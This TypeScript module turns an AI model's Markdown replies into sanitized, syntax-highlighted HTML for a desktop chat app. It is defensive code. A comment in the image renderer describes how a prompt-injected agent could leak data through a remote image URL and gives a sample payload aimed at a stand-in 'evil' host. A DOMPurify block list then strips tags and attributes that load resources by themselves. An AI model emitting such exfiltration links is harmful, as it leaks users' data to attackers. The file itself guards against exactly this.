// Markdown → sanitized HTML for messages, with syntax-highlighted code blocks.
//
// Model output is untrusted: everything goes through DOMPurify before it
// reaches the DOM (inside the desktop app a script injection would be able to
// call into the Tauri shell).

import { Marked, type Tokens } from 'marked';
import { markedHighlight } from 'marked-highlight';
import DOMPurify from 'dompurify';
import hljs from 'highlight.js/lib/core';
import bash from 'highlight.js/lib/languages/bash';
import c from 'highlight.js/lib/languages/c';
import cpp from 'highlight.js/lib/languages/cpp';
import csharp from 'highlight.js/lib/languages/csharp';
import css from 'highlight.js/lib/languages/css';
import diff from 'highlight.js/lib/languages/diff';
import go from 'highlight.js/lib/languages/go';
import java from 'highlight.js/lib/languages/java';
import javascript from 'highlight.js/lib/languages/javascript';
import json from 'highlight.js/lib/languages/json';
import markdown from 'highlight.js/lib/languages/markdown';
import powershell from 'highlight.js/lib/languages/powershell';
import python from 'highlight.js/lib/languages/python';
import rust from 'highlight.js/lib/languages/rust';
import sql from 'highlight.js/lib/languages/sql';
import typescript from 'highlight.js/lib/languages/typescript';
import xml from 'highlight.js/lib/languages/xml';
import yaml from 'highlight.js/lib/languages/yaml';

const languages = {
  bash, c, cpp, csharp, css, diff, go, java, javascript, json, markdown,
  powershell, python, rust, sql, typescript, xml, yaml,
};
for (const [name, lang] of Object.entries(languages)) hljs.registerLanguage(name, lang);
hljs.registerAliases(['sh', 'shell', 'zsh', 'console'], { languageName: 'bash' });
hljs.registerAliases(['js', 'jsx', 'mjs'], { languageName: 'javascript' });
hljs.registerAliases(['ts', 'tsx'], { languageName: 'typescript' });
hljs.registerAliases(['html', 'svg', 'svelte', 'vue'], { languageName: 'xml' });
hljs.registerAliases(['ps1', 'ps', 'pwsh'], { languageName: 'powershell' });
hljs.registerAliases(['py'], { languageName: 'python' });
hljs.registerAliases(['rs'], { languageName: 'rust' });
hljs.registerAliases(['yml', 'toml'], { languageName: 'yaml' });
hljs.registerAliases(['md'], { languageName: 'markdown' });
hljs.registerAliases(['cs'], { languageName: 'csharp' });

const escapeHtml = (s: string) =>
  s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');

const marked = new Marked(
  markedHighlight({
    emptyLangClass: 'hljs',
    langPrefix: 'hljs language-',
    highlight(code, lang) {
      const language = lang && hljs.getLanguage(lang) ? lang : null;
      return language ? hljs.highlight(code, { language }).value : escapeHtml(code);
    },
  }),
);

marked.use({
  gfm: true,
  tokenizer: {
    // Only ~~double tildes~~ strike text through. GFM also takes single
    // ones, which mangles everyday text like "(~$50) … (~$57)".
    del(src) {
      const m = /^~~(?=\S)([\s\S]*?\S)~~(?!~)/.exec(src);
      if (!m) return undefined;
      return { type: 'del', raw: m[0], text: m[1], tokens: this.lexer.inlineTokens(m[1]) };
    },
  },
  renderer: {
    // Code blocks get a header with the language and a copy button; the
    // click is handled by the Markdown component.
    code(token: Tokens.Code) {
      const lang = (token.lang || '').trim().split(/\s+/)[0];
      const body = token.escaped ? token.text : escapeHtml(token.text);
      return (
        `<div class="codeblock"><div class="codeblock-head"><span>${escapeHtml(lang || 'text')}</span>` +
        `<button type="button" data-copy>Copy</button></div>` +
        `<pre><code class="hljs">${body}</code></pre></div>`
      );
    },
    // Images in a reply are shown as links, never loaded: a remote image
    // fetches its URL as soon as it renders, so a prompt-injected agent could
    // leak data in it (`![](https://evil/?d=…)`) without anyone clicking.
    image(token: Tokens.Image) {
      const label = escapeHtml(token.text || token.title || 'image');
      return /^https?:/i.test(token.href)
        ? `<a href="${escapeHtml(token.href)}" title="${escapeHtml(token.href)}">🖼 ${label}</a>`
        : label;
    },
  },
});

// The same goes for raw HTML in a reply: no tags that load things by
// themselves, and no inline styles (`background: url(…)` loads too).
const PURIFY = {
  USE_PROFILES: { html: true },
  FORBID_TAGS: ['img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'svg', 'object', 'embed', 'iframe', 'link', 'style'],
  FORBID_ATTR: ['style', 'srcset', 'background', 'poster'],
};

export function renderMarkdown(text: string): string {
  const html = marked.parse(text, { async: false }) as string;
  return DOMPurify.sanitize(html, PURIFY) as string;
}
